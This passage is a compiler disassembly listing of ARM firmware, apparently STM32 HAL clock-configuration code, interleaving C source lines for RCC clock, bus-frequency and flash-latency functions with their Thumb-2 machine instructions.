 8004208:	4b2e      	ldr	r3, [pc, #184]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 800420a:	689b      	ldr	r3, [r3, #8]
 800420c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004210:	687b      	ldr	r3, [r7, #4]
 8004212:	689b      	ldr	r3, [r3, #8]
 8004214:	492b      	ldr	r1, [pc, #172]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004216:	4313      	orrs	r3, r2
 8004218:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 800421a:	4b29      	ldr	r3, [pc, #164]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 800421c:	681b      	ldr	r3, [r3, #0]
 800421e:	f003 0307 	and.w	r3, r3, #7
 8004222:	683a      	ldr	r2, [r7, #0]
 8004224:	429a      	cmp	r2, r3
 8004226:	d210      	bcs.n	800424a <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004228:	4b25      	ldr	r3, [pc, #148]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 800422a:	681b      	ldr	r3, [r3, #0]
 800422c:	f023 0207 	bic.w	r2, r3, #7
 8004230:	4923      	ldr	r1, [pc, #140]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 8004232:	683b      	ldr	r3, [r7, #0]
 8004234:	4313      	orrs	r3, r2
 8004236:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004238:	4b21      	ldr	r3, [pc, #132]	; (80042c0 <HAL_RCC_ClockConfig+0x1ec>)
 800423a:	681b      	ldr	r3, [r3, #0]
 800423c:	f003 0307 	and.w	r3, r3, #7
 8004240:	683a      	ldr	r2, [r7, #0]
 8004242:	429a      	cmp	r2, r3
 8004244:	d001      	beq.n	800424a <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 8004246:	2301      	movs	r3, #1
 8004248:	e036      	b.n	80042b8 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 800424a:	687b      	ldr	r3, [r7, #4]
 800424c:	681b      	ldr	r3, [r3, #0]
 800424e:	f003 0304 	and.w	r3, r3, #4
 8004252:	2b00      	cmp	r3, #0
 8004254:	d008      	beq.n	8004268 <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 8004256:	4b1b      	ldr	r3, [pc, #108]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004258:	689b      	ldr	r3, [r3, #8]
 800425a:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 800425e:	687b      	ldr	r3, [r7, #4]
 8004260:	68db      	ldr	r3, [r3, #12]
 8004262:	4918      	ldr	r1, [pc, #96]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004264:	4313      	orrs	r3, r2
 8004266:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 8004268:	687b      	ldr	r3, [r7, #4]
 800426a:	681b      	ldr	r3, [r3, #0]
 800426c:	f003 0308 	and.w	r3, r3, #8
 8004270:	2b00      	cmp	r3, #0
 8004272:	d009      	beq.n	8004288 <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 8004274:	4b13      	ldr	r3, [pc, #76]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004276:	689b      	ldr	r3, [r3, #8]
 8004278:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 800427c:	687b      	ldr	r3, [r7, #4]
 800427e:	691b      	ldr	r3, [r3, #16]
 8004280:	00db      	lsls	r3, r3, #3
 8004282:	4910      	ldr	r1, [pc, #64]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004284:	4313      	orrs	r3, r2
 8004286:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8004288:	f000 f824 	bl	80042d4 <HAL_RCC_GetSysClockFreq>
 800428c:	4602      	mov	r2, r0
 800428e:	4b0d      	ldr	r3, [pc, #52]	; (80042c4 <HAL_RCC_ClockConfig+0x1f0>)
 8004290:	689b      	ldr	r3, [r3, #8]
 8004292:	091b      	lsrs	r3, r3, #4
 8004294:	f003 030f 	and.w	r3, r3, #15
 8004298:	490b      	ldr	r1, [pc, #44]	; (80042c8 <HAL_RCC_ClockConfig+0x1f4>)
 800429a:	5ccb      	ldrb	r3, [r1, r3]
 800429c:	f003 031f 	and.w	r3, r3, #31
 80042a0:	fa22 f303 	lsr.w	r3, r2, r3
 80042a4:	4a09      	ldr	r2, [pc, #36]	; (80042cc <HAL_RCC_ClockConfig+0x1f8>)
 80042a6:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 80042a8:	4b09      	ldr	r3, [pc, #36]	; (80042d0 <HAL_RCC_ClockConfig+0x1fc>)
 80042aa:	681b      	ldr	r3, [r3, #0]
 80042ac:	4618      	mov	r0, r3
 80042ae:	f7fc ff29 	bl	8001104 <HAL_InitTick>
 80042b2:	4603      	mov	r3, r0
 80042b4:	72fb      	strb	r3, [r7, #11]

  return status;
 80042b6:	7afb      	ldrb	r3, [r7, #11]
}
 80042b8:	4618      	mov	r0, r3
 80042ba:	3710      	adds	r7, #16
 80042bc:	46bd      	mov	sp, r7
 80042be:	bd80      	pop	{r7, pc}
 80042c0:	40022000 	.word	0x40022000
 80042c4:	40021000 	.word	0x40021000
 80042c8:	0800d21c 	.word	0x0800d21c
 80042cc:	20000000 	.word	0x20000000
 80042d0:	20000004 	.word	0x20000004

080042d4 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 80042d4:	b480      	push	{r7}
 80042d6:	b089      	sub	sp, #36	; 0x24
 80042d8:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 80042da:	2300      	movs	r3, #0
 80042dc:	61fb      	str	r3, [r7, #28]
 80042de:	2300      	movs	r3, #0
 80042e0:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80042e2:	4b3e      	ldr	r3, [pc, #248]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 80042e4:	689b      	ldr	r3, [r3, #8]
 80042e6:	f003 030c 	and.w	r3, r3, #12
 80042ea:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 80042ec:	4b3b      	ldr	r3, [pc, #236]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 80042ee:	68db      	ldr	r3, [r3, #12]
 80042f0:	f003 0303 	and.w	r3, r3, #3
 80042f4:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80042f6:	693b      	ldr	r3, [r7, #16]
 80042f8:	2b00      	cmp	r3, #0
 80042fa:	d005      	beq.n	8004308 <HAL_RCC_GetSysClockFreq+0x34>
 80042fc:	693b      	ldr	r3, [r7, #16]
 80042fe:	2b0c      	cmp	r3, #12
 8004300:	d121      	bne.n	8004346 <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 8004302:	68fb      	ldr	r3, [r7, #12]
 8004304:	2b01      	cmp	r3, #1
 8004306:	d11e      	bne.n	8004346 <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 8004308:	4b34      	ldr	r3, [pc, #208]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 800430a:	681b      	ldr	r3, [r3, #0]
 800430c:	f003 0308 	and.w	r3, r3, #8
 8004310:	2b00      	cmp	r3, #0
 8004312:	d107      	bne.n	8004324 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 8004314:	4b31      	ldr	r3, [pc, #196]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 8004316:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 800431a:	0a1b      	lsrs	r3, r3, #8
 800431c:	f003 030f 	and.w	r3, r3, #15
 8004320:	61fb      	str	r3, [r7, #28]
 8004322:	e005      	b.n	8004330 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004324:	4b2d      	ldr	r3, [pc, #180]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 8004326:	681b      	ldr	r3, [r3, #0]
 8004328:	091b      	lsrs	r3, r3, #4
 800432a:	f003 030f 	and.w	r3, r3, #15
 800432e:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004330:	4a2b      	ldr	r2, [pc, #172]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x10c>)
 8004332:	69fb      	ldr	r3, [r7, #28]
 8004334:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004338:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800433a:	693b      	ldr	r3, [r7, #16]
 800433c:	2b00      	cmp	r3, #0
 800433e:	d10d      	bne.n	800435c <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 8004340:	69fb      	ldr	r3, [r7, #28]
 8004342:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004344:	e00a      	b.n	800435c <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 8004346:	693b      	ldr	r3, [r7, #16]
 8004348:	2b04      	cmp	r3, #4
 800434a:	d102      	bne.n	8004352 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 800434c:	4b25      	ldr	r3, [pc, #148]	; (80043e4 <HAL_RCC_GetSysClockFreq+0x110>)
 800434e:	61bb      	str	r3, [r7, #24]
 8004350:	e004      	b.n	800435c <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 8004352:	693b      	ldr	r3, [r7, #16]
 8004354:	2b08      	cmp	r3, #8
 8004356:	d101      	bne.n	800435c <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 8004358:	4b23      	ldr	r3, [pc, #140]	; (80043e8 <HAL_RCC_GetSysClockFreq+0x114>)
 800435a:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 800435c:	693b      	ldr	r3, [r7, #16]
 800435e:	2b0c      	cmp	r3, #12
 8004360:	d134      	bne.n	80043cc <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 8004362:	4b1e      	ldr	r3, [pc, #120]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 8004364:	68db      	ldr	r3, [r3, #12]
 8004366:	f003 0303 	and.w	r3, r3, #3
 800436a:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 800436c:	68bb      	ldr	r3, [r7, #8]
 800436e:	2b02      	cmp	r3, #2
 8004370:	d003      	beq.n	800437a <HAL_RCC_GetSysClockFreq+0xa6>
 8004372:	68bb      	ldr	r3, [r7, #8]
 8004374:	2b03      	cmp	r3, #3
 8004376:	d003      	beq.n	8004380 <HAL_RCC_GetSysClockFreq+0xac>
 8004378:	e005      	b.n	8004386 <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 800437a:	4b1a      	ldr	r3, [pc, #104]	; (80043e4 <HAL_RCC_GetSysClockFreq+0x110>)
 800437c:	617b      	str	r3, [r7, #20]
      break;
 800437e:	e005      	b.n	800438c <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 8004380:	4b19      	ldr	r3, [pc, #100]	; (80043e8 <HAL_RCC_GetSysClockFreq+0x114>)
 8004382:	617b      	str	r3, [r7, #20]
      break;
 8004384:	e002      	b.n	800438c <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 8004386:	69fb      	ldr	r3, [r7, #28]
 8004388:	617b      	str	r3, [r7, #20]
      break;
 800438a:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 800438c:	4b13      	ldr	r3, [pc, #76]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 800438e:	68db      	ldr	r3, [r3, #12]
 8004390:	091b      	lsrs	r3, r3, #4
 8004392:	f003 0307 	and.w	r3, r3, #7
 8004396:	3301      	adds	r3, #1
 8004398:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 800439a:	4b10      	ldr	r3, [pc, #64]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 800439c:	68db      	ldr	r3, [r3, #12]
 800439e:	0a1b      	lsrs	r3, r3, #8
 80043a0:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 80043a4:	697a      	ldr	r2, [r7, #20]
 80043a6:	fb03 f202 	mul.w	r2, r3, r2
 80043aa:	687b      	ldr	r3, [r7, #4]
 80043ac:	fbb2 f3f3 	udiv	r3, r2, r3
 80043b0:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 80043b2:	4b0a      	ldr	r3, [pc, #40]	; (80043dc <HAL_RCC_GetSysClockFreq+0x108>)
 80043b4:	68db      	ldr	r3, [r3, #12]
 80043b6:	0e5b      	lsrs	r3, r3, #25
 80043b8:	f003 0303 	and.w	r3, r3, #3
 80043bc:	3301      	adds	r3, #1
 80043be:	005b      	lsls	r3, r3, #1
 80043c0:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 80043c2:	697a      	ldr	r2, [r7, #20]
 80043c4:	683b      	ldr	r3, [r7, #0]
 80043c6:	fbb2 f3f3 	udiv	r3, r2, r3
 80043ca:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 80043cc:	69bb      	ldr	r3, [r7, #24]
}
 80043ce:	4618      	mov	r0, r3
 80043d0:	3724      	adds	r7, #36	; 0x24
 80043d2:	46bd      	mov	sp, r7
 80043d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043d8:	4770      	bx	lr
 80043da:	bf00      	nop
 80043dc:	40021000 	.word	0x40021000
 80043e0:	0800d234 	.word	0x0800d234
 80043e4:	00f42400 	.word	0x00f42400
 80043e8:	007a1200 	.word	0x007a1200

080043ec <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 80043ec:	b480      	push	{r7}
 80043ee:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 80043f0:	4b03      	ldr	r3, [pc, #12]	; (8004400 <HAL_RCC_GetHCLKFreq+0x14>)
 80043f2:	681b      	ldr	r3, [r3, #0]
}
 80043f4:	4618      	mov	r0, r3
 80043f6:	46bd      	mov	sp, r7
 80043f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043fc:	4770      	bx	lr
 80043fe:	bf00      	nop
 8004400:	20000000 	.word	0x20000000

08004404 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004404:	b580      	push	{r7, lr}
 8004406:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 8004408:	f7ff fff0 	bl	80043ec <HAL_RCC_GetHCLKFreq>
 800440c:	4602      	mov	r2, r0
 800440e:	4b06      	ldr	r3, [pc, #24]	; (8004428 <HAL_RCC_GetPCLK1Freq+0x24>)
 8004410:	689b      	ldr	r3, [r3, #8]
 8004412:	0a1b      	lsrs	r3, r3, #8
 8004414:	f003 0307 	and.w	r3, r3, #7
 8004418:	4904      	ldr	r1, [pc, #16]	; (800442c <HAL_RCC_GetPCLK1Freq+0x28>)
 800441a:	5ccb      	ldrb	r3, [r1, r3]
 800441c:	f003 031f 	and.w	r3, r3, #31
 8004420:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004424:	4618      	mov	r0, r3
 8004426:	bd80      	pop	{r7, pc}
 8004428:	40021000 	.word	0x40021000
 800442c:	0800d22c 	.word	0x0800d22c

08004430 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004430:	b580      	push	{r7, lr}
 8004432:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004434:	f7ff ffda 	bl	80043ec <HAL_RCC_GetHCLKFreq>
 8004438:	4602      	mov	r2, r0
 800443a:	4b06      	ldr	r3, [pc, #24]	; (8004454 <HAL_RCC_GetPCLK2Freq+0x24>)
 800443c:	689b      	ldr	r3, [r3, #8]
 800443e:	0adb      	lsrs	r3, r3, #11
 8004440:	f003 0307 	and.w	r3, r3, #7
 8004444:	4904      	ldr	r1, [pc, #16]	; (8004458 <HAL_RCC_GetPCLK2Freq+0x28>)
 8004446:	5ccb      	ldrb	r3, [r1, r3]
 8004448:	f003 031f 	and.w	r3, r3, #31
 800444c:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004450:	4618      	mov	r0, r3
 8004452:	bd80      	pop	{r7, pc}
 8004454:	40021000 	.word	0x40021000
 8004458:	0800d22c 	.word	0x0800d22c

0800445c <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 800445c:	b580      	push	{r7, lr}
 800445e:	b086      	sub	sp, #24
 8004460:	af00      	add	r7, sp, #0
 8004462:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 8004464:	2300      	movs	r3, #0
 8004466:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 8004468:	4b2a      	ldr	r3, [pc, #168]	; (8004514 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800446a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800446c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004470:	2b00      	cmp	r3, #0
 8004472:	d003      	beq.n	800447c <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 8004474:	f7ff f9a6 	bl	80037c4 <HAL_PWREx_GetVoltageRange>
 8004478:	6178      	str	r0, [r7, #20]
 800447a:	e014      	b.n	80044a6 <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 800447c:	4b25      	ldr	r3, [pc, #148]	; (8004514 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800447e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004480:	4a24      	ldr	r2, [pc, #144]	; (8004514 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004482:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8004486:	6593      	str	r3, [r2, #88]	; 0x58
 8004488:	4b22      	ldr	r3, [pc, #136]	; (8004514 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800448a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800448c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004490:	60fb      	str	r3, [r7, #12]
 8004492:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 8004494:	f7ff f996 	bl	80037c4 <HAL_PWREx_GetVoltageRange>
 8004498:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 800449a:	4b1e      	ldr	r3, [pc, #120]	; (8004514 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800449c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800449e:	4a1d      	ldr	r2, [pc, #116]	; (8004514 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044a0:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80044a4:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 80044a6:	697b      	ldr	r3, [r7, #20]
 80044a8:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80044ac:	d10b      	bne.n	80044c6 <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 80044ae:	687b      	ldr	r3, [r7, #4]
 80044b0:	2b80      	cmp	r3, #128	; 0x80
 80044b2:	d919      	bls.n	80044e8 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 80044b4:	687b      	ldr	r3, [r7, #4]
 80044b6:	2ba0      	cmp	r3, #160	; 0xa0
 80044b8:	d902      	bls.n	80044c0 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80044ba:	2302      	movs	r3, #2
 80044bc:	613b      	str	r3, [r7, #16]
 80044be:	e013      	b.n	80044e8 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044c0:	2301      	movs	r3, #1
 80044c2:	613b      	str	r3, [r7, #16]
 80044c4:	e010      	b.n	80044e8 <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 80044c6:	687b      	ldr	r3, [r7, #4]
 80044c8:	2b80      	cmp	r3, #128	; 0x80
 80044ca:	d902      	bls.n	80044d2 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 80044cc:	2303      	movs	r3, #3
 80044ce:	613b      	str	r3, [r7, #16]
 80044d0:	e00a      	b.n	80044e8 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 80044d2:	687b      	ldr	r3, [r7, #4]
 80044d4:	2b80      	cmp	r3, #128	; 0x80
 80044d6:	d102      	bne.n	80044de <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80044d8:	2302      	movs	r3, #2
 80044da:	613b      	str	r3, [r7, #16]
 80044dc:	e004      	b.n	80044e8 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 80044de:	687b      	ldr	r3, [r7, #4]
 80044e0:	2b70      	cmp	r3, #112	; 0x70
 80044e2:	d101      	bne.n	80044e8 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044e4:	2301      	movs	r3, #1
 80044e6:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 80044e8:	4b0b      	ldr	r3, [pc, #44]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044ea:	681b      	ldr	r3, [r3, #0]
 80044ec:	f023 0207 	bic.w	r2, r3, #7
 80044f0:	4909      	ldr	r1, [pc, #36]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044f2:	693b      	ldr	r3, [r7, #16]
 80044f4:	4313      	orrs	r3, r2
 80044f6:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 80044f8:	4b07      	ldr	r3, [pc, #28]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044fa:	681b      	ldr	r3, [r3, #0]
 80044fc:	f003 0307 	and.w	r3, r3, #7
 8004500:	693a      	ldr	r2, [r7, #16]
 8004502:	429a      	cmp	r2, r3
 8004504:	d001      	beq.n	800450a <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 8004506:	2301      	movs	r3, #1
 8004508:	e000      	b.n	800450c <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 800450a:	2300      	movs	r3, #0
}
 800450c:	4618      	mov	r0, r3
 800450e:	3718      	adds	r7, #24
 8004510:	46bd      	mov	sp, r7
 8004512:	bd80      	pop	{r7, pc}
 8004514:	40021000 	.word	0x40021000
 8004518:	40022000 	.word	0x40022000

0800451c <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 800451c:	b580      	push	{r7, lr}
 800451e:	b086      	sub	sp, #24
 8004520:	af00      	add	r7, sp, #0
 8004522:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004524:	2300      	movs	r3, #0
 8004526:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 8004528:	2300      	movs	r3, #0
 800452a:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 800452c:	687b      	ldr	r3, [r7, #4]
 800452e:	681b      	ldr	r3, [r3, #0]
 8004530:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004534:	2b00      	cmp	r3, #0
 8004536:	d031      	beq.n	800459c <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 8004538:	687b      	ldr	r3, [r7, #4]
